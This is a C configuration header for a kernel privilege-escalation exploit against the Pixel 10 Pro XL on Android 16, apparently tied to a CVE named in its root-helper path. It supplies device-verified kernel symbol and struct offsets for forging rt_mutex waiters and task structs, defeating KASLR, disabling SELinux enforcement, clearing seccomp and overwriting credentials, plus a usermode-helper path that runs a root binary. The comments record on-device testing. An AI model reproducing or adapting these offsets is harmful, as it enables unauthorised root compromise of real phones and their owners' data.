// mustang — Pixel 10 Pro XL, Android 16
// Build: BD1A.250702.001
// Kernel: 6.6.82-android15-8
// Offsets extracted from boot.img via kallsyms-finder
// Struct fields BTF-VERIFIED against this device's own kernel Image
// (6.6.82-android15-8-g55bfc90aa731-ab13641008-4k, carved via
// extract_kernel_btf.py + pahole -F btf, 2026-10): task_struct 18 fields,
// mm_struct.owner 1032, file f_op/private_data, rt_mutex_waiter +
// rt_waiter_node (the FAKE_WAITER_* block), cred, seccomp, thread_info,
// page, pipe_buffer, miscdevice (fops @ +0x10), work_struct,
// pool_workqueue, worker_pool, workqueue_struct, file_operations 13 slots,
// rb_node 24B geometry - 74/74 values exact, zero changes required.
// Symbol offsets above remain kallsyms-finder device-verified.
// Launch firmware for the Pixel 10 Pro XL, dated Aug. 2025.
// Should also work for the Verizon A3 alt.

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "mustang-BD1A.250702.001-app"
#else
#define BUILD_VARIANT_LABEL "mustang-BD1A.250702.001-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/mustang/mustang:16/BD1A.250702.001/13724644:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

// ── Kernel symbol offsets (extracted from mustang kallsyms) ──
#define ASHMEM_IOCTL_OFF            0x00c79254ULL
#define ASHMEM_MMAP_OFF             0x00c79964ULL
#define ASHMEM_OPEN_OFF             0x00c79b84ULL
#define ASHMEM_RELEASE_OFF          0x00c79c0cULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c79c98ULL

// ashmem_misc_fops not in kallsyms → using frankel offset
#define ASHMEM_MISC_FOPS_OFF        0x0228c568ULL
#define ASHMEM_FOPS_OFF             0x012c9eb8ULL   /* const struct file_operations ashmem_fops (.rodata) */
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c79910ULL   /* compat_ashmem_ioctl */
#define ASHMEM_LLSEEK_OFF           0x00c790ecULL   /* ashmem_llseek (fops->llseek is NOT noop_llseek on this build) */
#define ASHMEM_READ_ITER_OFF        0x00c79194ULL   /* extra fops sanity anchor */

#define CONFIGFS_READ_ITER_OFF      0x004875d4ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00487b00ULL
#define COPY_SPLICE_READ_OFF        0x0040c0d0ULL
#define NOOP_LLSEEK_OFF             0x003befa4ULL
#define INIT_TASK_OFF               0x020de280ULL
#define ROOT_TASK_GROUP_OFF         0x022d4580ULL
// Runtime selinux_enforcing: no such kallsyms symbol on mustang. The live
// state is struct selinux_state; 'enforcing' is member #0 (DEVELOP=y,
// DISABLE=n). Verify: disassemble selinux_status_update_setenforce
// (VA ffffffc080636768) - it stores to selinux_state+0.
// Boot-time anchor: selinux_enforcing_boot = 0x0207cae0 (dump-confirmed).
#define SELINUX_STATE_OFF           0x02315e78ULL   /* &selinux_state */
#define SELINUX_ENFORCING_OFF       0x02315e78ULL   /* selinux_state.enforcing (+0) */
#define SELINUX_BLOB_SIZES_OFF      0x0164d928ULL
#define SECURITY_HOOK_HEADS_OFF     0x0164d1f0ULL
#define KMALLOC_CACHES_OFF          0x0164cd30ULL
#define ANON_PIPE_BUF_OPS_OFF       0x0114a2c8ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000cefd0ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x020cae60ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)

// ── Slide references ──
#define SLIDE_NFULNL_LOGGER_OFF     0x020d2258ULL   /* nfulnl_logger */
#define SLIDE_LOGGERS_0_1_OFF       0x020d21a8ULL   /* &loggers[0][1] = loggers(0x020d21a0)+8; holds runtime &nfulnl_logger */
/* rb_left write target: random_table boot_id entry's .data POINTER SLOT.
 * kallsyms: random_table = 0x021F8330 (RANDOM_TABLE_OFF); stride 0x40, so
 * entry[4] "bootid" starts at +4*0x40 = 0x021F8430 and its .data pointer slot
 * (+8) = 0x021F8438, normally holding &sysctl_bootid (0x02336e68). Functionally
 * validated on-device 2026-10-26: with this target the slide produced a
 * page-aligned runtime KASLR base (the object-target 0x02336e68 previously
 * produced a constant alias echo and later a qspinlock UBSAN panic).
 * CAUTION: must NOT be the sysctl_bootid object (0x02336e68) itself - writing
 * the alias constant into the object's bytes makes the "leak" a fixed
 * PAGE_OFFSET echo, text_addr() lands low, and the PI walk qspinlocks a
 * mid-struct field -> queued_spin_lock_slowpath UBSAN panic. Also corrupts
 * the boot_id UUID system-wide (object bytes, unrecoverable until reboot).
 * Same .data-slot semantics as frankel/mustang-CP2A (0x02249468). */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x021F8438ULL
#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF     0x02336e68ULL

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

// ── Page layout ──
#define LOCK_OFF        0x1350
#define W0_OFF          0x2220
#define FOPS_OFF        0x1000
#define SCRATCH_OFF     0x3000
#define RIGHT_OFF       0x4440
#define LEFT_OFF        0x5550
#define FAKE_TASK_OFF   0x3200

/* BTF (mustang Image): struct rt_waiter_node {rb_node entry @0 (24B);
 * int prio @0x18; u64 deadline @0x20}, size 40; struct rt_mutex_waiter
 * {tree @0x00, pi_tree @0x28, task @0x50, lock @0x58, wake_state @0x60,
 * ww_ctx @0x68}, size 0x70. All 9 offsets below exact. */
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x50
#define FAKE_WAITER_LOCK_OFF            0x58
#define FAKE_WAITER_WAKE_STATE_OFF      0x60
#define FAKE_WAITER_WW_CTX_OFF          0x68

#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x348
#define FAKE_TASK_PI_LOCK_OFF       0x90c
#define FAKE_TASK_PI_WAITERS_OFF    0x920
#define FAKE_TASK_PI_TOP_TASK_OFF   0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938

#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

#define WQ_DFL_PWQ_OFF    0xb0
#define PWQ_POOL_OFF       0x00
#define PWQ_WQ_OFF         0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF     0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF  0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF  0x28
#define POOL_NR_IDLE_OFF   0x3c

#define WORK_DATA_OFF  0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF  0x18

// ── Struct field offsets (frankel inherit) ──
#define TASK_PID_OFF                  0x618
#define TASK_TGID_OFF                 0x61c
#define TASK_REAL_PARENT_OFF          0x628
#define TASK_REAL_CRED_OFF            0x818
#define TASK_CRED_OFF                 0x820
#define TASK_COMM_OFF                 0x830
#define TASK_TASKS_OFF                0x550
#define TASK_THREAD_INFO_FLAGS_OFF    0x00
#define TASK_SECCOMP_OFF              0x8e8
#define TASK_ATOMIC_FLAGS_OFF         0x5d8

#define CRED_UID_OFF                  8
#define CRED_SECUREBITS_OFF           40
#define CRED_CAPS_OFF                 48
#define CRED_SECURITY_OFF             128
#define SELINUX_CRED_BLOB_OFF         0
#define SELINUX_CRED_OSID_OFF         0
#define SELINUX_CRED_SID_OFF          4

#define SECCOMP_MODE_OFF              0x00
#define SECCOMP_FILTER_COUNT_OFF      0x04
#define SECCOMP_FILTER_OFF            0x08
#define TIF_SECCOMP_BIT               11
#define PFA_NO_NEW_PRIVS_BIT          0

#define MM_OWNER_OFF                  1032
#define PIPE_BUFFER_SIZE              0x28

#define WAITER_LOCAL_OFF              0x80
#define WAITER_TREE_ENTRY_OFF         0x00
#define WAITER_PI_TREE_ENTRY_OFF      0x18
#define WAITER_TASK_OFF               0x30
#define WAITER_LOCK_OFF               0x38
#define WAITER_WAKE_STATE_OFF         0x40
#define WAITER_PRIO_OFF               0x44
#define WAITER_DEADLINE_OFF           0x48
#define WAITER_WW_CTX_OFF             0x50

#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SLOTS             32
#define PIPE_BUF_FLAG_CAN_MERGE       0x10

#define FOPS_OWNER_OFF          0x00
#define FOPS_LLSEEK_OFF         0x08
#define FOPS_READ_OFF           0x10
#define FOPS_WRITE_OFF          0x18
#define FOPS_READ_ITER_OFF      0x20
#define FOPS_WRITE_ITER_OFF     0x28
#define FOPS_IOCTL_OFF          0x48
#define FOPS_COMPAT_IOCTL_OFF   0x50
#define FOPS_MMAP_OFF           0x58
#define FOPS_OPEN_OFF           0x68
#define FOPS_RELEASE_OFF        0x78
#define FOPS_SPLICE_READ_OFF    0xb8
#define FOPS_SHOW_FDINFO_OFF    0xd8

// ── su_daemon UMH ──
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#endif
